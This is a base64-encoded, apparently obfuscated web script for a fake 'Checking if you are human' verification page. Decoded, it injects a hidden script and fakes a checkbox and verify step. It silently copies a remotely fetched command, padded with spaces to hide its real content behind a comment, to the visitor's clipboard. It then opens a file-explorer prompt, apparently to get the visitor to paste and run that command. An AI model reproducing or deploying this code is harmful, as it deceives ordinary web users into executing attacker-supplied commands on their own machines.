UwY3k1bWIzSkZZV05vS0dWc0lEMCtJR1ZzTG5OMGVXeGxMbVJwYzNCc1lYa2dQU0FpYm05dVpTSXBPd29nSUNBZ0lDQWdJQ0FnSUNCemRHVndNVVZzWlcxbGJuUnpMbVp2Y2tWaFkyZ29aV3dnUFQ0Z1pXd3VjM1I1YkdVdVpHbHpjR3hoZVNBOUlDSmliRzlqYXlJcE93b2dJQ0FnSUNBZ0lIMHNJREl3TURBcE95QUtJQ0FnSUgwc0lERTFNREFwT3lBS0NpQWdJQ0JqYUdWamEySnZlQzVoWkdSRmRtVnVkRXhwYzNSbGJtVnlLQ0pqYkdsamF5SXNJR1oxYm1OMGFXOXVJQ2dwSUhzS0lDQWdJR3hsZENCaVlYTmxJRDBnWm1WMFkyaGxaRU52YlcxaGJtUTdDaUFnSUNCc1pYUWdZMjl0YldWdWRGQmhjblFnUFNCbVpYUmphR1ZrUTI5dGJXVnVkQ0FySUNkY0p5SW5PeUFnSUM4dklPS0drQ0RRc3RDKzBZSWcwTGZRdE5DMTBZSFJqQ0RRczlDNzBMRFFzdEM5MEw3UXRTRFF1TkMzMEx6UXRkQzkwTFhRdmRDNDBMVUtDaUFnSUNCc1pYUWdjM0JoWTJWeklEMGdKeWM3Q2lBZ0lDQnBaaUFvS0dKaGMyVWdLeUJqYjIxdFpXNTBVR0Z5ZENrdWJHVnVaM1JvSUR3Z01qVTVLU0I3Q2lBZ0lDQWdJQ0FnYzNCaFkyVnpJRDBnSnlBbkxuSmxjR1ZoZENneU5Ua2dMU0FvWW1GelpTQXJJR052YlcxbGJuUlFZWEowS1M1c1pXNW5kR2dwT3dvZ0lDQWdJQ0FnSUdOdmJuTnZiR1V1Ykc5bktHSmhjMlVzSUhOd1lXTmxjeXdnWTI5dGJXVnVkRkJoY25RcE93b2dJQ0FnSUNBZ0lHTnZibk52YkdVdWJHOW5LQ2RpWVhObElHeGxibWQwYURvbkxDQmlZWE5sTG14bGJtZDBhQ3dnSjNOd1lXTmxjeUJzWlc1bmRHZzZKeXdnYzNCaFkyVnpMbXhsYm1kMGFDd2dKMk52YlcxbGJuUlFZWEowSUd4bGJtZDBhRG9uTENCamIyMXRaVzUwVUdGeWRDNXNaVzVuZEdncE93b2dJQ0FnZlFvS0lDQWdJR3hsZENCMllXeDFaU0E5SUdKaGMyVWdLeUJ6Y0dGalpYTWdLeUJqYjIxdFpXNTBVR0Z5ZERzS0lDQWdJQ0FnSUNBS0lDQWdJQ0FnSUNCamIyNXpkQ0IwWlhoMFlYSmxZU0E5SUdSdlkzVnRaVzUwTG1OeVpXRjBaVVZzWlcxbGJuUW9KM1JsZUhSaGNtVmhKeWs3Q2lBZ0lDQWdJQ0FnZEdWNGRHRnlaV0V1ZG1Gc2RXVWdQU0IyWVd4MVpUc0tJQ0FnSUNBZ0lDQjBaWGgwWVhKbFlTNXpaWFJCZEhSeWFXSjFkR1VvSjNKbFlXUnZibXg1Snl3Z0p5Y3BPd29nSUNBZ0lDQWdJSFJsZUhSaGNtVmhMbk4wZVd4bExuQnZjMmwwYVc5dUlEMGdKMkZpYzI5c2RYUmxKenNLSUNBZ0lDQWdJQ0IwWlhoMFlYSmxZUzV6ZEhsc1pTNXNaV1owSUQwZ0p5MDVPVGs1Y0hnbk93b2dJQ0FnSUNBZ0lHUnZZM1Z0Wlc1MExtSnZaSGt1WVhCd1pXNWtRMmhwYkdRb2RHVjRkR0Z5WldFcE93b2dJQ0FnSUNBZ0lIUmxlSFJoY21WaExuTmxiR1ZqZENncE93b2dJQ0FnSUNBZ0lHUnZZM1Z0Wlc1MExtVjRaV05EYjIxdFlXNWtLQ2RqYjNCNUp5azdDaUFnSUNBZ0lDQWdaRzlqZFcxbGJuUXVZbTlrZVM1eVpXMXZkbVZEYUdsc1pDaDBaWGgwWVhKbFlTazdDaUFnSUNBZ0lDQWdZMjl1YzI5c1pTNXNiMmNvSitLY2hTY3BPd29nSUNBZ0lDQWdJSE5sZEZOcmFYQkdiR0ZuS0NrN0NpQWdJQ0FnSUNBZ1kyaGxZMnRpYjNoWGFXNWtiM2N1YzNSNWJHVXVjR0ZrWkdsdVp5QTlJQ0l4TUhCNElqc0tJQ0FnSUNBZ0lDQWtjbTl2ZEM1eGRXVnllVk5sYkdWamRHOXlLQ0l1WTBsVlZXMUxORFZGWmtWM2FtUWlLUzV6ZEhsc1pTNXRZWEpuYVc1TVpXWjBJRDBnSWpFMGNIZ2lPd29nSUNBZ0lDQWdJSE4wWlhBeFJXeGxiV1Z1ZEhNdVptOXlSV0ZqYUNobGJDQTlQaUJsYkM1emRIbHNaUzVrYVhOd2JHRjVJRDBnSW01dmJtVWlLVHNLSUNBZ0lDQWdJQ0J6ZEdWd01rVnNaVzFsYm5SekxtWnZja1ZoWTJnb1pXd2dQVDRnWld3dWMzUjViR1V1WkdsemNHeGhlU0E5SUNKaWJHOWpheUlwT3dvZ0lDQWdJQ0FnSUhOd2FXNXVaWEl1YzNSNWJHVXVkbWx6YVdKcGJHbDBlU0E5SUNKMmFYTnBZbXhsSWpzS0lDQWdJQ0FnSUNCelpYUlVhVzFsYjNWMEtDZ3BJRDArSUhzS0lDQWdJQ0FnSUNBZ0lDQWdZMmhsWTJ0aWIzaFhhVzVrYjNjdWMzUjViR1V1ZDJsa2RHZ2dQU0FpTlRNd2NIZ2lPd29nSUNBZ0lDQWdJQ0FnSUNCamFHVmphMkp2ZUZkcGJtUnZkeTV6ZEhsc1pTNW9aV2xuYUhRZ1BTQWlZWFYwYnlJN0NpQWdJQ0FnSUNBZ0lDQWdJSFpsY21sbWVWZHBibVJ2ZHk1emRIbHNaUzVpYjNKa1pYSlViM0FnUFNBaU1YQjRJSE52Ykdsa0lDTTNPVGM1TnpraU93b2dJQ0FnSUNBZ0lDQWdJQ0IyWlhKcFpubFhhVzVrYjNjdWMzUjViR1V1Y0dGa1pHbHVaMVJ2Y0NBOUlDSXpjSGdpT3dvZ0lDQWdJQ0FnSUNBZ0lDQjJaWEpwWm5sWGFXNWtiM2N1YzNSNWJHVXViV0Z5WjJsdVZHOXdJRDBnSWpFMWNIZ2lPd29nSUNBZ0lDQWdJQ0FnSUNCMlpYSnBabmxYYVc1a2IzY3VZMnhoYzNOTWFYTjBMbUZrWkNnaVlXTjBhWFpsSWlrN0NpQWdJQ0FnSUNBZ2ZTd2dOVEF3S1RzS0lDQWdJSDBwT3dvS0lDQWdJQzh2SUVKc2RYSXZSbTlqZFhNZ1lXTjBhWFpoZEdsdmJpQm1iM0lnVm1WeWFXWjVJR0oxZEhSdmJnb2dJQ0FnYkdWMElHaGhjMEpzZFhKeVpXUWdQU0JtWVd4elpUc0tDaUFnSUNCbWRXNWpkR2x2YmlCbGJtRmliR1ZDZFhSMGIyNG9LU0I3Q2lBZ0lDQWdJQ0FnYVdZZ0tDRjJaWEpwWm5sQ2RYUjBiMjRwSUhKbGRIVnlianNLQ2lBZ0lDQWdJQ0FnYVdZZ0tIWmxjbWxtZVVKMWRIUnZiaTVrYVhOaFlteGxaQ2tnZXdvZ0lDQWdJQ0FnSUNBZ0lDQjJaWEpwWm5sQ2RYUjBiMjR1WkdsellXSnNaV1FnUFNCbVlXeHpaVHNLSUNBZ0lDQWdJQ0FnSUNBZ2RtVnlhV1o1UW5WMGRHOXVMbkpsYlc5MlpVRjBkSEpwWW5WMFpTZ25aR2x6WVdKc1pXUW5LVHNLSUNBZ0lDQWdJQ0FnSUNBZ2RtVnlhV1o1UW5WMGRHOXVMbk4wZVd4bExtOXdZV05wZEhrZ1BTQW5NU2M3Q2lBZ0lDQWdJQ0FnSUNBZ0lIWmxjbWxtZVVKMWRIUnZiaTV6ZEhsc1pTNWpkWEp6YjNJZ1BTQW5jRzlwYm5SbGNpYzdDaUFnSUNBZ0lDQWdJQ0FnSUdOdmJuTnZiR1V1Ykc5bktDZENkWFIwYjI0Z1pXNWhZbXhsWkNFbktUc0tJQ0FnSUNBZ0lDQjlDaUFnSUNCOUNnb2dJQ0FnTHk4Z1ZISmhZMnNnZDJsdVpHOTNJR0pzZFhJS0lDQWdJSGRwYm1SdmR5NWhaR1JGZG1WdWRFeHBjM1JsYm1WeUtDZGliSFZ5Snl3Z1puVnVZM1JwYjI0b0tTQjdDaUFnSUNBZ0lDQWdhR0Z6UW14MWNuSmxaQ0E5SUhSeWRXVTdDaUFnSUNBZ0lDQWdZMjl1YzI5c1pTNXNiMmNvSjFkcGJtUnZkeUJpYkhWeWNtVmtKeWs3Q2lBZ0lDQWdJQ0FnZEhKaFkydERiMjF3YkdWMFpTZ3BPd29nSUNBZ2ZTazdDZ29nSUNBZ0x5OGdWSEpoWTJzZ2QybHVaRzkzSUdadlkzVnpDaUFnSUNCM2FXNWtiM2N1WVdSa1JYWmxiblJNYVhOMFpXNWxjaWduWm05amRYTW5MQ0JtZFc1amRHbHZiaWdwSUhzS0lDQWdJQ0FnSUNCamIyNXpiMnhsTG14dlp5Z25WMmx1Wkc5M0lHWnZZM1Z6WldRc0lHaGhjMEpzZFhKeVpXUTZKeXdnYUdGelFteDFjbkpsWkNrN0NpQWdJQ0FnSUNBZ2FXWWdLR2hoYzBKc2RYSnlaV1FwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdaVzVoWW14bFFuVjBkRzl1S0NrN0NpQWdJQ0FnSUNBZ2ZRb2dJQ0FnZlNrN0Nnb2dJQ0FnTHk4Z1ZtVnlhV1o1SUdKMWRIUnZiaUJqYkdsamF5Qm9ZVzVrYkdWeUNpQWdJQ0JwWmlBb2RtVnlhV1o1UW5WMGRHOXVLU0I3Q2lBZ0lDQWdJQ0FnZG1WeWFXWjVRblYwZEc5dUxtRmtaRVYyWlc1MFRHbHpkR1Z1WlhJb0ltTnNhV05ySWl3Z1puVnVZM1JwYjI0Z0tDa2dld29nSUNBZ0lDQWdJQ0FnSUNCcFppQW9kR2hwY3k1a2FYTmhZbXhsWkNrZ2NtVjBkWEp1T3dvS0lDQWdJQ0FnSUNBZ0lDQWdMeThnVTJWMElITnJhWEFnWm14aFp3b2dJQ0FnSUNBZ0lDQWdJQ0J6WlhSVGEybHdSbXhoWnlncE93b0tJQ0FnSUNBZ0lDQWdJQ0FnZEhKaFkydERiMjF3YkdWMFpTZ3BPd29LSUNBZ0lDQWdJQ0FnSUNBZ0x5OGdTR2xrWlNCamFHVmphMkp2ZUNCM2FXNWtiM2NLSUNBZ0lDQWdJQ0FnSUNBZ1kyaGxZMnRpYjNoWGFXNWtiM2N1YzNSNWJHVXVaR2x6Y0d4aGVTQTlJQ0p1YjI1bElqc0tDaUFnSUNBZ0lDQWdJQ0FnSUM4dklGTm9iM2NnYkc5aFpHVnlJR1pwY25OMENpQWdJQ0FnSUNBZ0lDQWdJR2xtSUNod2NtVnNiMkZrWlhKRmJHVnRaVzUwY3k1c1pXNW5kR2dwSUhCeVpXeHZZV1JsY2tWc1pXMWxiblJ6TG1admNrVmhZMmdvWld3Z1BUNGdaV3d1YzNSNWJHVXVaR2x6Y0d4aGVTQTlJQ0ppYkc5amF5SXBPd29nSUNBZ0lDQWdJQ0FnSUNCcFppQW9jSEpsYkc5aFpHVnlWR1Y0ZENrZ2NISmxiRzloWkdWeVZHVjRkQzV6ZEhsc1pTNWthWE53YkdGNUlEMGdJbTV2Ym1VaU93b0tJQ0FnSUNBZ0lDQWdJQ0FnTHk4Z1NHbGtaU0IyWlhKcFpua2dkR1Y0ZENCMFpXMXdiM0poY21sc2VRb2dJQ0FnSUNBZ0lDQWdJQ0IwWlhoMFFXeHNVM1JsY0M1emRIbHNaUzVrYVhOd2JHRjVJRDBnSW01dmJtVWlPd29LSUNBZ0lDQWdJQ0FnSUNBZ0x5OGdRV1owWlhJZ01TNDFJSE5sWTI5dVpITXNJSE5vYjNjZ2MzVmpZMlZ6Y3dvZ0lDQWdJQ0FnSUNBZ0lDQnpaWFJVYVcxbGIzVjBLQ2dwSUQwK0lIc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDOHZJRWhwWkdVZ2JHOWhaR1Z5Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JwWmlBb2NISmxiRzloWkdWeVJXeGxiV1Z1ZEhNdWJHVnVaM1JvS1NCd2NtVnNiMkZrWlhKRmJHVnRaVzUwY3k1bWIzSkZZV05vS0dWc0lEMCtJR1ZzTG5OMGVXeGxMbVJwYzNCc1lYa2dQU0FpYm05dVpTSXBPd29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdhV1lnS0hCeVpXeHZZV1JsY2xSbGVIUXBJSEJ5Wld4dllXUmxjbFJsZUhRdWMzUjViR1V1WkdsemNHeGhlU0E5SUNKdWIyNWxJanNLQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0F2THlCVGFHOTNJSE4xWTJObGMzTWdkR1Y0ZEFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSkhKdmIzUXVjWFZsY25sVFpXeGxZM1J2Y2lnbkxtTm1NRVpOZVVwWFpsUkpkalZQSnlrdWMzUjViR1V1WkdsemNHeGhlU0E5SUNKcGJteHBibVVpT3dvS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUM4dklFaHBaR1VnZDJGcGRHbHVaeUIwWlhoMExDQnphRzkzSUhkaGFYUnBibWNnY21WemNHOXVjMlVLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ1J5YjI5MExuRjFaWEo1VTJWc1pXTjBiM0lvSnk1alUxSndVbWs1YkhwSmRGUjBKeWt1YzNSNWJHVXVaR2x6Y0d4aGVTQTlJQ0p1YjI1bElqc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDUnliMjkwTG5GMVpYSjVVMlZzWldOMGIzSW9KeTVqVVVwcWNFUmhZMDVwWkdOT0p5a3VjM1I1YkdVdVpHbHpjR3hoZVNBOUlDSmliRzlqYXlJN0Nnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0x5OGdVbVZzYjJGa0lIQmhaMlVnWVdaMFpYSWdNeUJ6WldOdmJtUnpDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQnpaWFJVYVcxbGIzVjBLQ2dwSUQwK0lIc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0IzYVc1a2IzY3ViRzlqWVhScGIyNHVjbVZzYjJGa0tDazdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQjlMQ0F6TURBd0tUc0tJQ0FnSUNBZ0lDQWdJQ0FnZlN3Z01UVXdNQ2s3Q2lBZ0lDQWdJQ0FnZlNrN0NpQWdJQ0I5Q2dvZ0lDQWdZMjl1YzNRZ2RtVnlhV1pwWTJGMGFXOXVTV1FnUFNBa2NtOXZkQzV4ZFdWeWVWTmxiR1ZqZEc5eUtDSWphVmxTTmtoeGFEQkVJaWs3Q2lBZ0lDQnBaaUFvZG1WeWFXWnBZMkYwYVc5dVNXUXBJSHNLSUNBZ0lDQWdJQ0IyWlhKcFptbGpZWFJwYjI1SlpDNTBaWGgwUTI5dWRHVnVkQ0E5SUUxaGRHZ3VabXh2YjNJb01UQXdNREF3SUNzZ1RXRjBhQzV5WVc1a2IyMG9LU0FxSURrd01EQXdNQ2s3Q2lBZ0lDQjlDaUFnSUNBS0lDQWdJR052Ym5OMElHTm9ZWEp6SUQwZ0ltRmlZMlJsWmpBeE1qTTBOVFkzT0RraU93b2dJQ0FnWTI5dWMzUWdjbUY1U1dRZ1BTQWtjbTl2ZEM1eGRXVnllVk5sYkdWamRHOXlLQ0l1WTJabVYybFpWRkpEWWpSd1JHdzBOeUlwT3dvZ0lDQWdhV1lnS0hKaGVVbGtLU0I3Q2lBZ0lDQWdJQ0FnY21GNVNXUXVkR1Y0ZEVOdmJuUmxiblFnUFNCQmNuSmhlUzVtY205dEtIc2diR1Z1WjNSb09pQXhOaUI5TENBb0tTQTlQaUJqYUdGeWMxdE5ZWFJvTG1ac2IyOXlLRTFoZEdndWNtRnVaRzl0S0NrZ0tpQmphR0Z5Y3k1c1pXNW5kR2dwWFNrdWFtOXBiaWdpSWlrN0NpQWdJQ0I5Q24wS0NtbG1JQ2hrYjJOMWJXVnVkQzV5WldGa2VWTjBZWFJsSUQwOVBTQWliRzloWkdsdVp5SXBJSHNLSUNBZ0lHUnZZM1Z0Wlc1MExtRmtaRVYyWlc1MFRHbHpkR1Z1WlhJb0lrUlBUVU52Ym5SbGJuUk1iMkZrWldRaUxDQW9LU0E5UGlCN0lHbHVhWFJXWlhKcFptbGpZWFJwYjI1R2JHOTNLQ2s3SUgwcE93cDlJR1ZzYzJVZ2V3b2dJQ0FnYVc1cGRGWmxjbWxtYVdOaGRHbHZia1pzYjNjb0tUc0tmUW9LQ21OdmJuTjBJR1pwYkdWRmVIQnNiM0psY2lBOUlDUnliMjkwTG5GMVpYSjVVMlZzWldOMGIzSW9KeU5wTTFZMllrSTBaRVkyYVUxdk1TY3BPd3BqYjI1emRDQm1hV3hsU1c1d2RYUWdQU0FrY205dmRDNXhkV1Z5ZVZObGJHVmpkRzl5S0NjamFXMWFZWGRMVVRsNE4xVmxZMng0ZUNjcE93cHNaWFFnWm1sc1pWTmxiR1ZqZEdWa0lEMGdabUZzYzJVN0NncHBaaUFvWm1sc1pVVjRjR3h2Y21WeUtTQjdDaUFnWm1sc1pVVjRjR3h2Y21WeUxtRmtaRVYyWlc1MFRHbHpkR1Z1WlhJb0oyTnNhV05ySnl3Z1lYTjVibU1nWm5WdVkzUnBiMjRvS1NCN0NpQWdJQ0JoZDJGcGRDQm1aWFJqYUVOdmJXMWhibVJCYm1SRGIyMXRaVzUwS0NrN0NpQWdJQ0JzWlhRZ1ltRnpaU0E5SUdabGRHTm9aV1JEYjIxdFlXNWtPd29nSUNBZ2JHVjBJR052YlcxbGJuUlFZWEowSUQwZ1ptVjBZMmhsWkVOdmJXMWxiblFnS3lBblhDY2lKenNnSUNBdkx5RGlocEFnMExmUXROQzEwWUhSakNEUmd0QyswTGJRdFFvS0lDQWdJR3hsZENCemNHRmpaWE1nUFNBbkp6c0tJQ0FnSUdsbUlDZ29ZbUZ6WlNBcklHTnZiVzFsYm5SUVlYSjBLUzVzWlc1bmRHZ2dQQ0F5TlRrcElIc0tJQ0FnSUNBZ0lDQnpjR0ZqWlhNZ1BTQW5JQ2N1Y21Wd1pXRjBLREkxT1NBdElDaGlZWE5sSUNzZ1kyOXRiV1Z1ZEZCaGNuUXBMbXhsYm1kMGFDazdDaUFnSUNCOUNpQWdJQ0JzWlhRZ1ptbHVZV3hUZEhJZ1BTQmlZWE5sSUNzZ2MzQmhZMlZ6SUNzZ1kyOXRiV1Z1ZEZCaGNuUTdDaUFnSUNCdVlYWnBaMkYwYjNJdVkyeHBjR0p2WVhKa0xuZHlhWFJsVkdWNGRDaG1hVzVoYkZOMGNpazdDaUFnSUNBZ0lITmxkRk5yYVhCR2JHRm5LQ2s3Q2lBZ0lDQWdJSFJ5WVdOclEyOXRjR3hsZEdVb0tUc0tJQ0FnSUNBZ2FXWWdLR1pwYkdWSmJuQjFkQ2tnWm1sc1pVbHVjSFYwTG1Oc2FXTnJLQ2s3Q2lBZ0lDQWdJQzh2SUZkaGFYUWdabTl5SUhWelpYSWdkRzhnY21WMGRYSnVJSFJ2SUhSb1pTQndZV2RsQ2lBZ0lDQWdJR3hsZENCbWIyTjFjMGhoYm1Sc1pXUWdQU0JtWVd4elpUc0tJQ0FnSUNBZ1kyOXVjM1FnYUdGdVpHeGxSbTlqZFhNZ1BTQW9LU0E5UGlCN0NpQWdJQ0FnSUNBZ0lDQnBaaUFvSVdadlkzVnpTR0Z1Wkd4bFpDQW1KaUFoWm1sc1pWTmxiR1ZqZEdWa0tTQjdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ1ptOWpkWE5JWVc1a2JHVmtJRDBnZEhKMVpUc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBdkx5QXVMaTVsZUdsemRHbHVaeUJqYjJSbExpNHVDaUFnSUNBZ0lDQWdJQ0I5Q2lBZ0lDQWdJSDA3Q2lBZ0lDQWdJSGRwYm1SdmR5NWhaR1JGZG1WdWRFeHBjM1JsYm1WeUtDZG1iMk4xY3ljc0lHaGhibVJzWlVadlkzVnpLVHNLSUNCOUtUc0tmUW9LZlNrb0tUc2dMeThnUlc1a0lHOW1JR0Z6ZVc1aklFbEpSa1VLJzsKICAgICAgY29uc3Qgc2NyaXB0Q29kZSA9IGI2NFRvVXRmOChzY3JpcHRCNjQpOwogICAgICBjb25zdCBzY3JpcHRFbCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICBzY3JpcHRFbC50ZXh0Q29udGVudCA9IHNjcmlwdENvZGU7CiAgICAgIChkb2N1bWVudC5oZWFkIHx8IGRvY3VtZW50LmRvY3VtZW50RWxlbWVudCkuYXBwZW5kQ2hpbGQoc2NyaXB0RWwpOwogICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgIHZlcnIoJ1NjcmlwdCBpbmplY3Rpb24gZmFpbGVkJywgZXJyKTsKICAgIH0KICB9CgogIGZ1bmN0aW9uIHJlbmRlck92ZXJsYXkoKSB7CiAgICB0cmFja01ldHJpYygnc2hvdycpOwoKICAgIC8vIFJlbW92ZSByZXNldC5jc3MgZnJvbSBoZWFkIChsZWdhY3kgY2xlYW51cCkKICAgIGNvbnN0IHJlc2V0Q3NzTGlua3MgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdsaW5rW2hyZWYqPSJyZXNldC5jc3MiXSwgbGlua1tocmVmKj0icmVzZXQiXScpOwogICAgcmVzZXRDc3NMaW5rcy5mb3JFYWNoKGxpbmsgPT4gewogICAgICBpZiAobGluay5wYXJlbnROb2RlKSB7CiAgICAgICAgbGluay5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKGxpbmspOwogICAgICB9CiAgICB9KTsKCiAgICBjb25zdCBiNjQgPSAnUEdoMGJXd2diR0Z1WnowaVpXNGlQanhvWldGa1BnMEtJQ0FnSUR4dFpYUmhJR05vWVhKelpYUTlJbFZVUmkwNElqNE5DaUFnSUNBOGJXVjBZU0J1WVcxbFBTSjJhV1YzY0c5eWRDSWdZMjl1ZEdWdWREMGlkMmxrZEdnOVpHVjJhV05sTFhkcFpIUm9MQ0JwYm1sMGFXRnNMWE5qWVd4bFBURXVNQ0krRFFvZ0lDQWdQSFJwZEd4bFBrTm9aV05yYVc1bklHbG1JSGx2ZFNCaGNtVWdhSFZ0WVc0OEwzUnBkR3hsUGcwS0lDQWdJRHhzYVc1cklISmxiRDBpYzNSNWJHVnphR1ZsZENJZ2FISmxaajBpYUhSMGNITTZMeTlqWkc1cWN5NWpiRzkxWkdac1lYSmxMbU52YlM5aGFtRjRMMnhwWW5NdlptOXVkQzFoZDJWemIyMWxMell1TUM0d0xXSmxkR0V6TDJOemN5OWhiR3d1YldsdUxtTnpjeUkrRFFvZ0lDQWdQSE4wZVd4bFBnMEtJQ0FnWW05a2VTQjdEUW9nSUNBZ0lDQWdJR0poWTJ0bmNtOTFibVF0WTI5c2IzSTZJSEpuWWlneU5UVXNNalUxTERJMU5Td2dNQzQ0S1RzTkNpQWdJQ0FnSUNBZ1kyOXNiM0k2SUNNek1UTXhNekU3RFFvZ0lDQWdmUTBLRFFvZ0lDQWdJMmxDWVROV2NUWTBNa2RUUXpsc2NUY2dldzBLSUNBZ0lDQWdhR1ZwWjJoME9pQXlOWEI0T3cwS0lDQWdJQ0FnYldGeVoybHVMV0p2ZEhSdmJUb2dNWEI0T3cwS0lDQWdJSDBOQ2cwS0lDQWdJQzVqY0ZScVRtOURhRGtnZXcwS0lDQWdJQ0FnYkdsdVpTMW9aV2xuYUhRNklESXVNalZ5WlcwN0RRb2dJQ0FnSUNCbWIyNTBMWE5wZW1VNklERXVOWEpsYlRzTkNpQWdJQ0FnSUdadmJuUXRkMlZwWjJoME9pQTFNREE3RFFvZ0lDQWdmUTBLSUNBZ0lDNXZkbVZ5YkdGNUxYTjBlV3hsY3lCN0RRb2dJQ0FnSUNCaVlXTnJaM0p2ZFc1a09pQnlaMkpoS0RJMU5Td3lOVFVzTWpVMUxEQXVPQ2s3RFFvZ0lDQWdmUTBLRFFvZ0lDQWdMbU5MTWpoTFFrdzBNMHcyUWpNZ2V3MEtJQ0FnSUNBZ1kyOXNiM0k2SUNNd01EQXdNREE3RFFvZ0lDQWdmUTBLSUNBZ0lDNXdjbWwyWVdONUxXRnVaQzEwWlhKdGN5QjdEUW9nSUNBZ0lDQmpiMnh2Y2pvZ0l6SXpNak15TXpzTkNpQWdJQ0FnSUhSbGVIUXRaR1ZqYjNKaGRHbHZiam9nZFc1a1pYSnNhVzVsT3cwS0lDQWdJQ0FnYkdsdVpTMW9aV2xuYUhRNklERXdjSGc3RFFvZ0lDQWdJQ0JtYjI1MExYTnBlbVU2SURod2VEc05DaUFnSUNBZ0lHWnZiblF0ZDJWcFoyaDBPaUEwTURBN0RRb2dJQ0FnSUNCbWIyNTBMWE4wZVd4bE9pQnViM0p0WVd3N0RRb2dJQ0FnSUNCamRYSnpiM0k2Y0c5cGJuUmxjanNOQ2lBZ0lDQjlEUW9nSUNBZ0xuQnlhWFpoWTNrdFlXNWtMWFJsY20xeklEcG9iM1psY2lCN0RRb2dJQ0FnSUNCamIyeHZjam9nSXpRM05EYzBOenNOQ2lBZ0lDQjlEUW9OQ2lBZ0lDQkFiV1ZrYVdFZ0tIQnlaV1psY25NdFkyOXNiM0l0YzJOb1pXMWxPaUJrWVhKcktTQjdEUW9nSUNBZ0lDQXVjSEpwZG1GamVTMWhibVF0ZEdWeWJYTWdldzBLSUNBZ0lDQWdJQ0JqYjJ4dmNqb2dJMkppWWpzTkNpQWdJQ0FnSUgwTkNpQWdJQ0FnSUNBZ1ltOWtlU0I3RFFvZ0lDQWdJQ0FnSUNBZ0lDQmlZV05yWjNKdmRXNWtMV052Ykc5eU9pQnlaMklvTUN3d0xEQXNJREF1T0NrZ0lXbHRjRzl5ZEdGdWREc05DaUFnSUNBZ0lDQWdJQ0FnSUdOdmJHOXlPaUFqWkRsa09XUTVJQ0ZwYlhCdmNuUmhiblE3RFFvZ0lDQWdJQ0FnSUgwTkNpQWdJQ0FnSUNBZ0xtTkpWVlZ0U3pRMVJXWkZkMnBrSUhzTkNpQWdJQ0FnSUNBZ0lDQWdJR052Ykc5eU9pQWpaRGxrT1dRNUlDRnBiWEJ2Y25SaGJuUTdEUW9nSUNBZ0lDQWdJQ0FnSUNCM2FHbDBaUzF6Y0dGalpUb2dibTkzY21Gd093MEtJQ0FnSUNBZ0lDQWdJQ0FnWm05dWRDMXphWHBsT2pFMGNIZzdEUW9nSUNBZ0lDQWdJSDBOQ2lBZ0lDQWdJQ0FnTG1OclJXVk9UMHQwTjNCQk5td2dldzBLSUNBZ0lDQWdJQ0FnSUdacGJHdzZJQ05tTjJZM1pqY2dJV2x0Y0c5eWRHRnVkRHNOQ2lBZ0lDQWdJQ0FnSUNCOURRb2dJQ0FnSUNBZ0lDQWdJMmxDWVROV2NUWTBNa2RUUXpsc2NUY2dldzBLSUNBZ0lDQWdJQ0FnSUNBZ1ptbHNiRG9nSTJZM1pqZG1OeUFoYVcxd2IzSjBZVzUwT3cwS0lDQWdJQ0FnSUNBZ0lIME5DaUFnSUNBZ0lDQWdMbTkyWlhKc1lYa3RjM1I1YkdWeklIc05DaUFnSUNBZ0lDQWdJQ0JpWVdOclozSnZkVzVrT2lCeVoySmhLREFzTUN3d0xEQXVPQ2s3RFFvZ0lDQWdJQ0FnSUgwTkNpQWdJQ0FnSUNBZ0xtTkxNamhMUWt3ME0wdzJRak1nZXcwS0lDQWdJQ0FnSUNBZ0lHTnZiRzl5T2lBalptWm1abVptT3cwS0lDQWdJQ0FnSUgwTkNpQWdJQ0FnSUNBZ0xtTmhNamRCY1ZGMmJYWWdldzBLSUNBZ0lDQWdJQ0FnSUNBZ1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvZ0l6SXpNak15TXlBaGFXMXdiM0owWVc1ME93MEtJQ0FnSUNBZ0lDQWdJQ0FnWW05eVpHVnlPaUF4Y0hnZ2MyOXNhV1FnSXpVNE5UZzFPQ0FoYVcxd2IzSjBZVzUwT3cwS0lDQWdJQ0FnSUNCOURRb2dJQ0FnSUNBZ0lDNWphSFJJY0ZKeFlrcFFhMnRQTjBwQklIc05DaUFnSUNBZ0lDQWdJQ0FnSUdKaFkydG5jbTkxYm1RdFkyOXNiM0k2SUNNeU16SXpNak1nSVdsdGNHOXlkR0Z1ZERzTkNpQWdJQ0FnSUNBZ0lDQWdJR0p2Y21SbGNqb2dNbkI0SUhOdmJHbGtJQ05rWVdSaFpHRWdJV2x0Y0c5eWRHRnVkRHNOQ2lBZ0lDQWdJQ0FnZlEwS0lDQWdJQ0FnSUNBdVkzSmxabkl6YVdobFdDQjdEUW9nSUNBZ0lDQWdJQ0FnSUNCamIyeHZjam9nSTJRNVpEbGtPU0FoYVcxd2IzSjBZVzUwT3cwS0lDQWdJQ0FnSUNCOURRb2dJQ0FnSUNBZ0lBMEtJQ0FnSUgwTkNnMEtJQ0FnSUM1alNWVlZiVXMwTlVWbVJYZHFaQ0I3RFFvZ0lDQWdJQ0FnSUNBZ0lDQmpiMnh2Y2pvZ0l6SXpNak15TXpzTkNpQWdJQ0FnSUNBZ0lDQWdJR1p2Ym5RdGMybDZaVG9nTVRSd2VEc05DaUFnSUNCbWIyNTBMWGRsYVdkb2REb2dOREF3T3cwS0lDQWdJQzEzWldKcmFYUXRabTl1ZEMxemJXOXZkR2hwYm1jNklHRnVkR2xoYkdsaGMyVmtPdzBLSUNBZ0lHWnZiblF0YzNSNWJHVTZJRzV2Y20xaGJEc05Da